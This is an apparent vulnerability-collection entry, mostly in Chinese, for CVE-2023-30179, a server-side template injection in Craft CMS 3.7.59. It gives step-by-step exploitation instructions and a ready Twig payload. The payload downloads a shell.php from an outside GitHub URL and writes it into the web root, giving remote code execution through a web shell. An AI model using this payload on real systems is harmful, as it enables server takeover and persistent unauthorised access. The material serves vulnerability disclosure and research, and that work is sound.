# CVE-2023-30179

>   CraftCMS是一个灵活的、易于使用的内容管理系统。

## 来源

[https://datnlq.gitbook.io/cve/craft-cms/cve-2023-30179-server-side-template-injection](https://datnlq.gitbook.io/cve/craft-cms/cve-2023-30179-server-side-template-injection)

## 简介

CraftCMS在3.7.59版本中存在服务器端模板注入的漏洞，经过身份验证的攻击者可以将Twig模板注入用户照片位置字段，从而导致远程代码执行。

## 影响范围

-   CraftCMS 3.7.59

## 漏洞利用

Step 1: Go to User Settings -> Settings -> Inject SSTI Payload to User Photo Location field

Step 2: Upload new Avatar (My Account -> Photo)

Step 3: Go to Assets to view result of SSTI Payload

![img](./images/spaces%2FvryEdY1EuKstMeVqTVuK%2Fuploads%2F1CxmaSPRULSIH7qQ9Q2e%2Fimage.png)

![img](./images/spaces%2FvryEdY1EuKstMeVqTVuK%2Fuploads%2Fmpr9I73r6OWOf5J9v2d1%2Fimage.png)

**Payload:**

```
SSTI_UserPhotoLocation_RCE{% set source=['https://raw.githubusercontent.com/datnlq/CraftCMS/main/shell.php']|map('file_get_contents')|join %} {{{(source):"/var/www/html/craft_cms/web/shell.php"}|map("file_put_contents")|join()}}
```

![img](./images/spaces%2FvryEdY1EuKstMeVqTVuK%2Fuploads%2Fj8nVpiL7WU9OzWGjuFvd%2Fimage.png)

After that, we upload new avatar to trigger SSTI template. Access shell.php to RCE.

![img](./images/spaces%2FvryEdY1EuKstMeVqTVuK%2Fuploads%2Fn3DXfBcRvHrwz5joMeyh%2Fimage.png)